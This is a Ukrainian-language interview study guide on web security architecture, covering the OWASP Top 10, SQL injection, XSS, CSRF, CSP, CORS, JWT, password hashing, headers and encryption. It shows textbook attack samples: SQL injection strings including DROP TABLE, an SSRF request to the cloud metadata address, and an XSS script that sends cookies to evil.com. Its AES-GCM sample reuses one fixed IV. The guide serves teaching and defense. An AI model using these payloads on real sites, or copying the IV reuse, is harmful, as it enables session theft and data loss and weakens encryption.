# Security Architecture — Питання для інтерв'ю

## OWASP Top 10 — пояснити кожну вразливість

### 1. Broken Access Control
Користувач отримує доступ до ресурсів, до яких не повинен мати:
```
GET /api/users/456/orders  ← Користувач 123 бачить замовлення користувача 456
```
**Захист:** перевірка авторизації на кожному запиті, RBAC, row-level security.

### 2. Cryptographic Failures
Незашифровані чутливі дані, слабке шифрування:
- Паролі у plaintext
- HTTP замість HTTPS
- Слабкі алгоритми (MD5, SHA1)

**Захист:** HTTPS everywhere, bcrypt/scrypt/argon2 для паролів, AES-256 для даних.

### 3. Injection (SQL, NoSQL, OS Command)
```sql
-- SQL Injection
SELECT * FROM users WHERE id = '1; DROP TABLE users; --'
```
**Захист:** parameterized queries, ORM, input validation, prepared statements.

### 4. Insecure Design
Архітектурні помилки, які не виправити патчем:
- Відсутність rate limiting
- Немає валідації на серверній стороні
- Передбачувані ідентифікатори (autoincrement IDs)

**Захист:** threat modeling, security review на етапі дизайну.

### 5. Security Misconfiguration
- Default credentials
- Відкриті debug endpoints
- Детальні error messages у production
- Непотрібні HTTP методи

**Захист:** hardening checklist, автоматизоване сканування, мінімальні привілеї.

### 6. Vulnerable and Outdated Components
Залежності з відомими вразливостями.
**Захист:** `npm audit`, Snyk, Dependabot, регулярне оновлення.

### 7. Identification and Authentication Failures
- Brute force атаки
- Слабкі паролі
- Session fixation

**Захист:** rate limiting, MFA, secure session management, password policy.

### 8. Software and Data Integrity Failures
- Незахищений CI/CD pipeline
- Десеріалізація ненадійних даних
- Supply chain attacks

**Захист:** підпис артефактів, integrity checks, мінімізація залежностей.

### 9. Security Logging and Monitoring Failures
Немає логування security подій → атаки не виявляються.
**Захист:** логування auth events, anomaly detection, alerting.

### 10. Server-Side Request Forgery (SSRF)
Сервер робить запити до внутрішніх ресурсів від імені атакуючого:
```
POST /api/fetch-url
{ "url": "http://169.254.169.254/latest/meta-data/" }  ← AWS metadata
```
**Захист:** whitelist URL-ів, блокування internal IPs, мережева ізоляція.

---

## SQL Injection — як працює і як запобігти?

### Як працює
```typescript
// ❌ Вразливий код
const query = `SELECT * FROM users WHERE email = '${email}'`;
// Якщо email = "' OR '1'='1" → SELECT * FROM users WHERE email = '' OR '1'='1'
// Повертає ВСІХ користувачів

// Ще гірше: "'; DROP TABLE users; --"
```

### Захист
```typescript
// ✅ Parameterized queries (prepared statements)
const result = await db.query(
  "SELECT * FROM users WHERE email = $1",
  [email]
);

// ✅ ORM (Drizzle)
const user = await db
  .select()
  .from(users)
  .where(eq(users.email, email));

// ✅ Input validation
const EmailSchema = Type.String({ format: "email", maxLength: 255 });
```

**Правило:** НІКОЛИ не конкатенуй user input у SQL запити.

---

## XSS (Cross-Site Scripting) — типи і захист

### Stored XSS
Скрипт зберігається у БД і відображається іншим користувачам:
```html
<!-- Коментар від зловмисника -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

### Reflected XSS
Скрипт у URL параметрах:
```
https://site.com/search?q=<script>alert('XSS')</script>
```

### DOM-based XSS
JavaScript маніпулює DOM з ненадійними даними:
```javascript
// ❌ Вразливий
element.innerHTML = userInput;

// ✅ Безпечний
element.textContent = userInput;
```

### Захист
1. **Output encoding** — HTML escape при рендерингу
2. **Content Security Policy** — обмеження джерел скриптів
3. **HttpOnly cookies** — JavaScript не має доступу до cookies
4. **Input validation** — sanitize input
5. **Фреймворки** — React, Vue автоматично ескейплять (але `dangerouslySetInnerHTML` — ні!)

---

## CSRF (Cross-Site Request Forgery)

### Як працює
```html
<!-- На зловмисному сайті evil.com -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
<!-- Браузер відправить cookies банку автоматично! -->
```

### Захист
1. **SameSite cookies:**
```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

2. **CSRF Token:**
```html
<form>
  <input type="hidden" name="_csrf" value="random-token-from-server" />
</form>
```

3. **Перевірка Origin/Referer headers**
4. **Double Submit Cookie** — token у cookie і в header

---

## Content Security Policy (CSP)

CSP обмежує джерела завантаження ресурсів:
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: *.amazonaws.com;
  connect-src 'self' api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
```

**Директиви:**
- `default-src` — fallback для всіх типів
- `script-src` — звідки можна завантажувати JS
- `style-src` — звідки CSS
- `img-src` — звідки зображення
- `connect-src` — куди можна робити fetch/XHR
- `frame-ancestors` — хто може embed-ити сторінку (захист від clickjacking)

---

## CORS — як працює?

### Same-Origin Policy
Браузер блокує запити до іншого origin (протокол + домен + порт).

### CORS дозволяє кросс-доменні запити

**Simple requests** (GET, POST з простими headers):
```
Browser: GET /api/data
         Origin: https://frontend.com

Server:  Access-Control-Allow-Origin: https://frontend.com
```

**Preflight requests** (PUT, DELETE, custom headers):
```
Browser: OPTIONS /api/data                        ← preflight
         Origin: https://frontend.com
         Access-Control-Request-Method: DELETE

Server:  Access-Control-Allow-Origin: https://frontend.com
         Access-Control-Allow-Methods: GET, POST, DELETE
         Access-Control-Max-Age: 86400

Browser: DELETE /api/data                         ← actual request
```

**Важливо:**
- `Access-Control-Allow-Origin: *` — дозволяє з будь-якого origin (не для auth)
- Для cookies: `Access-Control-Allow-Credentials: true` + конкретний origin

---

## JWT Security Best Practices

1. **Короткий TTL** для access token (15 хвилин)
2. **Refresh token** у HttpOnly, Secure, SameSite cookie
3. **Не зберігай** JWT у localStorage (вразливий до XSS)
4. **Використовуй RS256** (asymmetric) замість HS256 (symmetric) для мікросервісів
5. **Перевіряй** `iss`, `aud`, `exp` claims
6. **Не зберігай** чутливі дані у payload (base64 !== encryption)
7. **Blacklist** для відкликаних токенів (Redis)
8. **Ротація** refresh tokens (кожен використовується лише раз)

### Token rotation
```
1. Access token expired
2. Client sends refresh token
3. Server validates refresh token
4. Server issues NEW access + NEW refresh token
5. Old refresh token invalidated
```

---

## Rate Limiting та захист від DDoS

### Рівні захисту

**1. Edge level (CDN/WAF):**
- Cloudflare, AWS WAF, AWS Shield
- IP reputation filtering
- Geographic blocking

**2. Infrastructure level:**
- Load balancer rate limiting
- Network firewall rules
- Auto-scaling

**3. Application level:**
- Per-user rate limiting (Redis)
- Per-endpoint limits
- Throttling для expensive operations

### Стратегії
```
Endpoint              | Limit
---                   | ---
POST /auth/login      | 5 req/min (brute force protection)
GET /api/users        | 100 req/min
POST /api/upload      | 10 req/hour
GET /api/search       | 30 req/min
```

---

## Безпечне зберігання паролів

### Алгоритми хешування

| Алгоритм | Рекомендація | Примітка |
|---|---|---|
| MD5 | ❌ Ніколи | Зламаний, занадто швидкий |
| SHA-256 | ❌ Для паролів | Занадто швидкий (GPU атаки) |
| bcrypt | ✅ Добре | Adaptive, work factor |
| scrypt | ✅ Добре | Memory-hard (захист від GPU/ASIC) |
| Argon2id | ✅ Найкраще | Winner of PHC, memory + CPU hard |

### Як працює bcrypt
```
bcrypt(password, salt, cost_factor) → hash

cost_factor = 12 означає 2^12 = 4096 ітерацій
Збільшення cost на 1 = 2x повільніше
```

### Правила
1. **Завжди** хешуй паролі (ніколи plaintext)
2. **Унікальний salt** для кожного пароля (bcrypt робить автоматично)
3. **Достатній cost factor** (bcrypt: 12+, scrypt: N=2^14+)
4. **Не обмежуй** максимальну довжину пароля (але розумний ліміт — 72 для bcrypt)
5. **Не показуй** чи email існує при помилці логіну ("Invalid email or password")

---

## Security Headers

```
# Захист від XSS
Content-Security-Policy: default-src 'self'

# Захист від clickjacking
X-Frame-Options: DENY

# Захист від MIME sniffing
X-Content-Type-Options: nosniff

# Захист від XSS (старий, CSP краще)
X-XSS-Protection: 0

# HTTPS тільки
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Контроль Referer
Referrer-Policy: strict-origin-when-cross-origin

# Обмеження API браузера
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

**Helmet.js** (для Express/Fastify) — встановлює всі ці headers автоматично.

---

## Шифрування даних

### At Rest (дані у БД/диску)
- **Full Disk Encryption** — AWS EBS encryption
- **Column-level encryption** — шифрування окремих полів (PII)
- **Transparent Data Encryption (TDE)** — на рівні БД

### In Transit (дані в мережі)
- **TLS 1.3** — для всіх HTTP з'єднань
- **mTLS** — взаємна автентифікація для мікросервісів
- **Certificate pinning** — для mobile додатків

### Application-level
```typescript
import crypto from "node:crypto";

// Symmetric encryption (AES-256-GCM)
const algorithm = "aes-256-gcm";
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(16);

function encrypt(text: string) {
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(text, "utf8", "hex");
  encrypted += cipher.final("hex");
  const tag = cipher.getAuthTag();
  return { encrypted, iv: iv.toString("hex"), tag: tag.toString("hex") };
}
```
